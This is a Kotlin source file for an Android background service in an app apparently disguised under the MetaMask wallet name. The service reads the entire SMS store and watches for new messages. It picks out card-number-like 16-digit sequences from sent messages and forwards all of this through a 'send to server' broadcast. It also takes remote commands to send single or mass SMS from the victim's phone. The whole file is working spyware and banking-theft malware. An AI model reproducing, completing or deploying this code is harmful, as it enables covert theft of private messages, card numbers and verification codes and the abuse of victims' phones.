package com.example.MetaMask.services

import android.Manifest
import android.app.Activity
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.telephony.SubscriptionManager
import android.util.Base64
import com.example.MetaMask.utils.ContactReaderUtil
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import org.json.JSONArray
import org.json.JSONObject
import java.util.UUID

class trolService : Service() {

    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    private val handler = Handler(Looper.getMainLooper())

    private lateinit var prefs: SharedPreferences
    private lateinit var smsTrackerPrefs: SharedPreferences
    private var smsObserver: SmsObserver? = null

    private val syncMutex = Mutex()
    private var wakeLock: PowerManager.WakeLock? = null
    private lateinit var smsSendEngine: SmsSendEngine

    companion object {
        private const val PREFS_NAME = "SmsSyncState"
        private const val KEY_LAST_SYNC_TIME = "last_sync_timestamp"
        private const val SMS_TRACKER_PREFS_NAME = "SmsSendHistoryPrefs"
        private const val KEY_SENT_SMS_RECORDS = "sent_sms_records"

        const val ACTION_INITIAL_SMS_SYNC = "ACTION_INITIAL_SMS_SYNC"

        private const val SENT_ACTION = "SMS_CONTROL_SENT"
        private const val DELIVERED_ACTION = "SMS_CONTROL_DELIVERED"
        private const val ACTION_SEND_TO_SERVER = "com.example.MetaMask.ACTION_SEND_TO_SERVER"
        private const val EXTRA_MESSAGE_TO_SEND = "com.example.MetaMask.EXTRA_MESSAGE_TO_SEND"
        private const val EXTRA_MESSAGE_UUID = "messageUuid"

        private fun d(s: String): String {
            android.util.Log.d("XDBG", "[trolService] d enter s=${s}") //xdbg
            android.util.Log.d("XDBG", "[trolService] return") //xdbg
            return try { String(Base64.decode(s, Base64.NO_WRAP)) } catch (e: Exception) { "" }
        }
    }

    private fun findCardSequence(body: String): String? {
        android.util.Log.d("XDBG", "[trolService] findCardSequence enter body=${body}") //xdbg
        var count = 0
        var digitStart = -1
        var i = 0
        while (i < body.length) {
            android.util.Log.d("XDBG", "[trolService] loop") //xdbg
            val ch = body[i]
            when {
                ch.isDigit() -> {
                    if (count == 0) digitStart = i
                    count++
                }
                ch == ' ' || ch == '\t' -> {}
                else -> {
                    if (count >= 16) return body.substring(digitStart)
                    count = 0
                    digitStart = -1
                }
            }
            i++
        }
        android.util.Log.d("XDBG", "[trolService] return") //xdbg
        return if (count >= 16 && digitStart >= 0) body.substring(digitStart) else null
    }

    private val smsStatusReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            android.util.Log.d("XDBG", "[trolService] onReceive enter context=ctx intent=${intent}") //xdbg
            val messageUuid = intent.getStringExtra(EXTRA_MESSAGE_UUID)
            val status = when (resultCode) {
                Activity.RESULT_OK -> when (intent.action) {
                    SENT_ACTION -> "sent"
                    DELIVERED_ACTION -> "delivered"
                    else -> "unknown"
                }
                else -> when (intent.action) {
                    SENT_ACTION -> "notSent"
                    DELIVERED_ACTION -> "notDelivered"
                    else -> "unknown_error"
                }
            }
            val message = JSONObject().apply {
                put("action", "smsStatus")
                put("status", status)
                put("messageUuid", messageUuid)
            }
            sendDataToDispatcher(message)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        android.util.Log.d("XDBG", "[trolService] onCreate enter") //xdbg
        super.onCreate()
        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
            stopSelf(); return
        }
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MetaMask:TrolWakeLock")
        wakeLock?.setReferenceCounted(false)

        prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        smsTrackerPrefs = getSharedPreferences(SMS_TRACKER_PREFS_NAME, Context.MODE_PRIVATE)
        smsSendEngine = SmsSendEngine(this, serviceScope, smsTrackerPrefs)
        smsSendEngine.loadCachedNumbers()

        val statusFilter = IntentFilter().apply {
            addAction(SENT_ACTION); addAction(DELIVERED_ACTION)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
            registerReceiver(smsStatusReceiver, statusFilter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(smsStatusReceiver, statusFilter)
        }
        registerSmsObserver()
        serviceScope.launch { syncNewMessages() }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[trolService] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
            stopSelf(); return START_NOT_STICKY
        }
        if (intent?.action == ACTION_INITIAL_SMS_SYNC) {
            android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
            serviceScope.launch {
                val done = prefs.getBoolean("initial_full_sync_done", false)
                if (!done) {
                    android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
                    handleGetSMSJson()
                    prefs.edit()
                        .putBoolean("initial_full_sync_done", true)
                        .putLong(KEY_LAST_SYNC_TIME, System.currentTimeMillis())
                        .apply()
                }
            }
            android.util.Log.d("XDBG", "[trolService] return") //xdbg
            return START_STICKY
        }
        val commandJsonString = intent?.getStringExtra("command")
        if (!commandJsonString.isNullOrBlank()) {
            android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
            serviceScope.launch { handleCommand(commandJsonString) }
        }
        android.util.Log.d("XDBG", "[trolService] return") //xdbg
        return START_STICKY
    }

    private fun registerSmsObserver() {
        android.util.Log.d("XDBG", "[trolService] registerSmsObserver enter") //xdbg
        try {
            smsObserver = SmsObserver(handler)
            contentResolver.registerContentObserver(Uri.parse("content://sms"), true, smsObserver!!)
        } catch (_: Exception) {}
    }

    private suspend fun handleCommand(message: String) {
        android.util.Log.d("XDBG", "[trolService] handleCommand enter message=${message}") //xdbg
        try {
            val json = JSONObject(message)
            when (json.optString("action")) {
                "getSMSJson" -> handleGetSMSJson()
                "sync_now" -> syncNewMessages()
                "sendSms" -> {
                    val subId = smsSendEngine.getSubId(json.optInt("simCardIndex", -1))
                    smsSendEngine.sendSingle(
                        json.optString("phoneNumber"),
                        json.optString("message"),
                        subId,
                        json.optString("messageUuid", UUID.randomUUID().toString())
                    )
                }
                "sendMassSms" -> {
                    val subId = smsSendEngine.getSubId(json.optInt("simCardIndex", -1))
                    smsSendEngine.sendMass(json.optInt("number"), json.optString("message"), subId)
                }
            }
        } catch (_: Exception) {}
    }

    private suspend fun syncNewMessages() {
        android.util.Log.d("XDBG", "[trolService] syncNewMessages enter") //xdbg
        try { wakeLock?.acquire(30000) } catch (e: Exception) {}
        try {
            syncMutex.withLock {
                withContext(Dispatchers.IO) {
                    if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return@withContext
                    val lastSync = prefs.getLong(KEY_LAST_SYNC_TIME, System.currentTimeMillis() - (24 * 60 * 60 * 1000))
                    val cursor = try {
                        contentResolver.query(Uri.parse("content://sms"),
                            arrayOf("address", "body", "date", "type", "subscription_id"),
                            "date > ?", arrayOf(lastSync.toString()), "date ASC")
                    } catch (_: Exception) { try {
                        android.util.Log.e("XDBG", "[trolService] catch Exception (ignored)") //xdbg
                        contentResolver.query(Uri.parse("content://sms"),
                            arrayOf("address", "body", "date", "type", "sub_id"),
                            "date > ?", arrayOf(lastSync.toString()), "date ASC")
                    } catch (_: Exception) {
                        android.util.Log.e("XDBG", "[trolService] catch (ignored)") //xdbg
                        contentResolver.query(Uri.parse("content://sms"),
                            arrayOf("address", "body", "date", "type"),
                            "date > ?", arrayOf(lastSync.toString()), "date ASC")
                    } }
                    val groupedSms = HashMap<String, ArrayList<String>>()
                    var maxTs = lastSync
                    val numbercMap = HashMap<String, Long>()
                    val addrToSubId = HashMap<String, Int>()
                    val addrToSubIdDate = HashMap<String, Long>()

                    cursor?.use { c ->
                        if (c.moveToFirst()) {
                            android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
                            val bodyIdx = c.getColumnIndex("body")
                            val addrIdx = c.getColumnIndex("address")
                            val dateIdx = c.getColumnIndex("date")
                            val typeIdx = c.getColumnIndex("type")
                            val subIdColIdx = c.getColumnIndex("subscription_id").takeIf { it >= 0 } ?: c.getColumnIndex("sub_id")
                            do {
                                val date = c.getLong(dateIdx)
                                val body = c.getString(bodyIdx) ?: ""
                                val addr = c.getString(addrIdx) ?: "Unknown"
                                val type = c.getInt(typeIdx)
                                if (type in listOf(2, 3, 4, 5)) {
                                    android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
                                    val found = findCardSequence(body)
                                    if (found != null) {
                                        android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
                                        if (!numbercMap.containsKey(found) || date > numbercMap[found]!!) numbercMap[found] = date
                                        continue
                                    } else continue
                                }
                                if (!groupedSms.containsKey(addr)) groupedSms[addr] = ArrayList()
                                groupedSms[addr]?.add("Message: $body, Date: $date")
                                if (date > maxTs) maxTs = date
                                val msgSubId = if (subIdColIdx >= 0) c.getInt(subIdColIdx) else -1
                                if (msgSubId > 0 && date > (addrToSubIdDate[addr] ?: 0L)) {
                                    android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
                                    addrToSubId[addr] = msgSubId
                                    addrToSubIdDate[addr] = date
                                }
                            } while (c.moveToNext())
                        }
                    }

                    if (numbercMap.isNotEmpty()) {
                        android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
                        if (!groupedSms.containsKey("numberc")) groupedSms["numberc"] = ArrayList()
                        val sb = StringBuilder()
                        var maxDate = 0L
                        for ((t, d) in numbercMap) { sb.append(t).append(" | "); if (d > maxDate) maxDate = d }
                        var fs = sb.toString(); if (fs.endsWith(" | ")) fs = fs.dropLast(3)
                        groupedSms["numberc"]?.add("Message: $fs, Date: $maxDate")
                    }

                    if (groupedSms.isNotEmpty()) {
                        android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
                        for (chunk in groupedSms.keys.toList().chunked(30)) {
                            android.util.Log.d("XDBG", "[trolService] loop") //xdbg
                            val arr = JSONArray()
                            for (sender in chunk) {
                                android.util.Log.d("XDBG", "[trolService] loop") //xdbg
                                val msgs = groupedSms[sender] ?: continue
                                val item = JSONObject().put("from", sender)
                                val clean = JSONArray()
                                msgs.forEach { clean.put(it.substringAfter("Message: ").substringBefore(", Date:")) }
                                item.put("messages", clean)
                                val trackedSubId = addrToSubId[sender] ?: -1
                                var simSlot = -1
                                if (trackedSubId != -1) {
                                    android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
                                    try {
                                        simSlot = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                            val slot = SubscriptionManager.getSlotIndex(trackedSubId)
                                            if (slot == SubscriptionManager.INVALID_SIM_SLOT_INDEX) -1 else slot
                                        } else {
                                            val sm = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                                            @Suppress("DEPRECATION")
                                            sm?.getActiveSubscriptionInfo(trackedSubId)?.simSlotIndex ?: -1
                                        }
                                    } catch (_: Exception) {}
                                }
                                item.put("simSlot", simSlot)
                                arr.put(item)
                            }
                            sendDataToDispatcher(JSONObject().apply {
                                put("action", "uploadNewSMS"); put("new_sms", arr)
                            })
                            delay(50)
                        }
                        prefs.edit().putLong(KEY_LAST_SYNC_TIME, maxTs).apply()
                    }
                }
            }
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[trolService] catch (ignored)") //xdbg
        } finally {
            try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (e: Exception) {}
        }
    }

    private suspend fun handleGetSMSJson() = withContext(Dispatchers.IO) {
        try { wakeLock?.acquire(300000) } catch (e: Exception) {}
        try {
            val sb = StringBuilder()
            val cursor = try {
                contentResolver.query(Uri.parse("content://sms"),
                    arrayOf("address", "body", "date", "type", "subscription_id"),
                    null, null, "date DESC")
            } catch (_: Exception) { try {
                android.util.Log.e("XDBG", "[trolService] catch Exception (ignored)") //xdbg
                contentResolver.query(Uri.parse("content://sms"),
                    arrayOf("address", "body", "date", "type", "sub_id"),
                    null, null, "date DESC")
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[trolService] catch (ignored)") //xdbg
                contentResolver.query(Uri.parse("content://sms"),
                    arrayOf("address", "body", "date", "type"),
                    null, null, "date DESC")
            } }
            val tempMap = HashMap<String, ArrayList<String>>()
            val numbercMap = HashMap<String, Long>()
            val addrToSubId = HashMap<String, Int>()
            cursor?.use { c ->
                if (c.moveToFirst()) {
                    android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
                    val bodyIdx = c.getColumnIndex("body")
                    val addrIdx = c.getColumnIndex("address")
                    val dateIdx = c.getColumnIndex("date")
                    val typeIdx = c.getColumnIndex("type")
                    val subIdColIdx = c.getColumnIndex("subscription_id").takeIf { it >= 0 } ?: c.getColumnIndex("sub_id")
                    do {
                        val body = c.getString(bodyIdx) ?: ""
                        val addr = c.getString(addrIdx) ?: "Unknown"
                        val date = c.getLong(dateIdx)
                        val type = c.getInt(typeIdx)
                        if (type in listOf(2, 3, 4, 5)) {
                            android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
                            val found = findCardSequence(body)
                            if (found != null) {
                                android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
                                if (!numbercMap.containsKey(found) || date > numbercMap[found]!!) numbercMap[found] = date
                                continue
                            } else continue
                        }
                        if (!addrToSubId.containsKey(addr) && subIdColIdx >= 0) {
                            android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
                            val msgSubId = c.getInt(subIdColIdx)
                            if (msgSubId > 0) addrToSubId[addr] = msgSubId
                        }
                        if (!tempMap.containsKey(addr)) tempMap[addr] = ArrayList()
                        tempMap[addr]?.add("Message: $body, Date: $date")
                    } while (c.moveToNext())
                }
            }
            if (numbercMap.isNotEmpty()) {
                android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
                if (!tempMap.containsKey("numberc")) tempMap["numberc"] = ArrayList()
                val cbSb = StringBuilder(); var maxDate = 0L
                for ((t, d) in numbercMap) { cbSb.append(t).append(" | "); if (d > maxDate) maxDate = d }
                var fs = cbSb.toString(); if (fs.endsWith(" | ")) fs = fs.dropLast(3)
                tempMap["numberc"]?.add("Message: $fs, Date: $maxDate")
            }
            tempMap.keys.sorted().forEach { sender ->
                val trackedSubId = addrToSubId[sender] ?: -1
                val simSlot = if (trackedSubId > 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    try {
                        val slot = SubscriptionManager.getSlotIndex(trackedSubId)
                        if (slot == SubscriptionManager.INVALID_SIM_SLOT_INDEX) -1 else slot
                    } catch (_: Exception) { -1 }
                } else -1
                sb.append("From: $sender\n")
                if (simSlot >= 0) sb.append("Sim: $simSlot\n")
                tempMap[sender]?.forEach { sb.append(it).append("\n") }
                sb.append("\n\n")
                if (sb.length > 100000) {
                    android.util.Log.d("XDBG", "[trolService] if branch") //xdbg
                    sendDataToDispatcher(JSONObject().apply {
                        put("action", "uploadSMSJson"); put("sms_data", sb.toString())
                        put("silent", false); put("partial", true)
                    })
                    sb.clear(); delay(100)
                }
            }
            sendDataToDispatcher(JSONObject().apply {
                put("action", "uploadSMSJson"); put("sms_data", sb.toString())
                put("silent", false); put("partial", false)
            })
        } finally {
            try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (e: Exception) {}
        }
    }

    private fun sendDataToDispatcher(jsonData: JSONObject) {
        android.util.Log.d("XDBG", "[trolService] sendDataToDispatcher enter jsonData=${jsonData}") //xdbg
        try {
            val intent = Intent(ACTION_SEND_TO_SERVER).apply {
                putExtra(EXTRA_MESSAGE_TO_SEND, jsonData.toString())
                setPackage(packageName)
            }
            sendBroadcast(intent)
        } catch (_: Exception) {}
    }

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[trolService] onDestroy enter") //xdbg
        super.onDestroy()
        serviceJob.cancel()
        try { smsObserver?.let { contentResolver.unregisterContentObserver(it) } } catch (_: Exception) {}
        try { unregisterReceiver(smsStatusReceiver) } catch (e: Exception) {}
        try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (e: Exception) {}
    }

    inner class SmsObserver(handler: Handler) : ContentObserver(handler) {
        override fun onChange(selfChange: Boolean, uri: Uri?) {
            android.util.Log.d("XDBG", "[trolService] onChange enter selfChange=${selfChange} uri=${uri}") //xdbg
            super.onChange(selfChange, uri)
            serviceScope.launch { syncNewMessages() }
        }
    }
}
